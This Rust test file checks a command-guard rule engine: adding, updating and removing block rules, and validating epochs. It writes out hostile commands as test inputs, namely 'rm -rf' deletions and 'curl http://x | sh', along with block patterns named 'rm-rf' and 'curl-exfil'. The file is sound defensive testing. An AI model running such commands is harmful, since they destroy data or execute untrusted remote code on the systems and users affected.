use fg_core::{CheckStage, RiskLevel, RuleScope, SafetyAction};
use fg_rules::{default_ruleset, RuleEngine};

fn block_rule(name: &str, pat: &str) -> fg_rules::GuardRule {
    fg_rules::GuardRule {
        name: name.into(),
        pattern: pat.into(),
        stage: CheckStage::Regex,
        action: SafetyAction::Block,
        risk_level: RiskLevel::L4,
        reason: "test".into(),
        scope: RuleScope::Command,
    }
}

#[test]
fn default_epoch_and_eval() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    assert_eq!(eng.epoch(), 1);
    let hits = eng.evaluate("run rm -rf /tmp/x");
    assert_eq!(hits.len(), 1);
    assert_eq!(hits[0].rule.name, "rm-rf");
}

#[test]
fn add_bumps_epoch() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    let e1 = eng.add(block_rule("curl-exfil", r"\bcurl\b.*\|")).unwrap();
    assert_eq!(e1, 2);
    assert_eq!(eng.epoch(), 2);
    let hits = eng.evaluate("curl http://x | sh");
    assert_eq!(hits.len(), 1);
    assert_eq!(hits[0].rule.name, "curl-exfil");
}

#[test]
fn duplicate_add_rejected() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    let err = eng.add(block_rule("rm-rf", r"other")).unwrap_err();
    assert!(matches!(err, fg_rules::RuleError::Duplicate(_)));
    assert_eq!(eng.epoch(), 1, "epoch unchanged on failed add");
}

#[test]
fn update_bumps_epoch() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    let e1 = eng
        .update("rm-rf", block_rule("rm-rf", r"\brm\s+-rf\s+/\b"))
        .unwrap();
    assert_eq!(e1, 2);
    let hits = eng.evaluate("rm -rf /home");
    assert_eq!(hits.len(), 1);
}

#[test]
fn update_missing_rejected() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    let err = eng.update("nope", block_rule("nope", r"x")).unwrap_err();
    assert!(matches!(err, fg_rules::RuleError::NotFound(_)));
}

#[test]
fn remove_bumps_epoch() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    let e1 = eng.remove("rm-rf").unwrap();
    assert_eq!(e1, 2);
    let hits = eng.evaluate("rm -rf /x");
    assert!(hits.is_empty());
}

#[test]
fn stale_epoch_rejected() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    eng.add(block_rule("r2", r"zzz")).unwrap();
    let cur = eng.epoch();
    let err = eng.check_epoch(cur - 1).unwrap_err();
    assert!(matches!(err, fg_core::GuardError::StaleEpoch { .. }));
}

#[test]
fn zero_epoch_allowed() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    assert!(
        eng.check_epoch(0).is_ok(),
        "caller_epoch=0 means unknown, skip check"
    );
}

#[test]
fn current_epoch_allowed() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    assert!(eng.check_epoch(eng.epoch()).is_ok());
}

#[test]
fn list_returns_snapshot() {
    let eng = RuleEngine::new(default_ruleset()).unwrap();
    eng.add(block_rule("r2", r"zzz")).unwrap();
    let rs = eng.list();
    assert_eq!(rs.epoch, 2);
    assert_eq!(rs.rules.len(), 2);
}
